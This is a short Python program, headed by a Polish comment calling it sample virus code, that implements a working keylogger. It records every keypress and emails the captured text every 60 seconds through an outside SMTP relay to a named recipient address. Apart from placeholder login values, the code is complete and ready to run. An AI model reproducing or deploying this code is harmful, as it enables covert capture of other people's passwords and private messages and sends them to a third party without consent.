# Jest to PRZYKŁADOWY SAM KOD wirusa. Jak widać nie jest on zbyt długi i ciężki do napisania, jednakże może spowodować ogromne straty.

import keyboard  
import smtplib  
from email.mime.text import MIMEText
import threading
import time

EMAIL_ADDRESS = "x"  
EMAIL_PASSWORD = "x"  
EMAIL_RECEIVER = "antoni.bogus@1lokutno.onmicrosoft.com"  
SMTP_SERVER = "smtp.mailersend.net"  
SMTP_PORT = 587

log = ""

def on_press(event):
    global log
    if event.name == "space":
        log += " "
    elif event.name == "backspace":
        log = log[:-1]
    elif event.name == "enter":
        log += ""  
    elif event.name == "ctrl":
        log += ""  
    elif event.name == "alt":
        log += ""  
    elif event.name == "shift":
        log += ""
    else:
        log += event.name

def send_email():
    global log
    if log:
        msg = MIMEText(f"Dane z keyloggera:\n\n{log}")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_RECEIVER
        msg["Subject"] = "Raport Keyloggera"
        
        try:
            print("Wysylanie emaila...")  
            server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, EMAIL_RECEIVER, msg.as_string())
            server.quit()
            print("Email wyslany pomyslnie.") 
        except Exception as e:
            print(f"Blad w wysylaniu emaila: {e}")  

def report():
    while True:
        time.sleep(60)  
        send_email()

def start_keylogger():
    keyboard.on_press(on_press)
    keyboard.wait()

if __name__ == "__main__":
    print("Keylogger uruchomiony. nacisnij ctrl+c aby zatrzymac program")  
    threading.Thread(target=report, daemon=True).start()
    start_keylogger()